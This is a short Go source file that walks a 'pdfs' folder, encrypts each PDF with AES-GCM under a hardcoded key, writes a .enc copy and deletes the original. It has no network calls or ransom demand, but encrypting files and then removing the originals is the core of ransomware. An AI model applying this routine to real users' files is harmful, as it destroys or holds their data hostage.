package main

import (
	"fmt"
	"path/filepath"
	"os"
	"strings"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"

)

func main() {
	folder := "pdfs"
	const aes_key = "uLY8zbyw9IVLy3fOcVZ1tikuFf2m9irP"

	err := filepath.Walk(folder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Error accessing path: ", path, err)
			return err
		}

		if !info.IsDir() && strings.HasSuffix(info.Name(), ".pdf") {
			data, err := os.ReadFile(path)
			if err != nil {
				fmt.Println("Error reading file: ", path, err)
				return err
			}

			file, err := os.Create(path + ".enc")
			if err != nil {
				fmt.Println(err)
			}

			defer file.Close()

			aes_key_byted := []byte(aes_key)
			aes_key_cipher, _ := aes.NewCipher(aes_key_byted)

			gcm, err := cipher.NewGCM(aes_key_cipher)
			if err != nil {
				fmt.Println("Something went wrong!")
				return err
			}

			nonce := make([]byte, gcm.NonceSize())
			_, err = io.ReadFull(rand.Reader, nonce)

			encrypted_data := gcm.Seal(nonce, nonce, data, nil)

			_, err = file.Write(encrypted_data)
			if err != nil {
				fmt.Println("Something went wrong!")
				return err
			}

			err = os.Remove(path)
			if err != nil {
				fmt.Println("Something went wrong!")
				return err
			}

			fmt.Println("Encryption successfull!")
		}

		return err
	})

	if err != nil {
		fmt.Println("Error walking through the files/folders", err)
		return
	}

}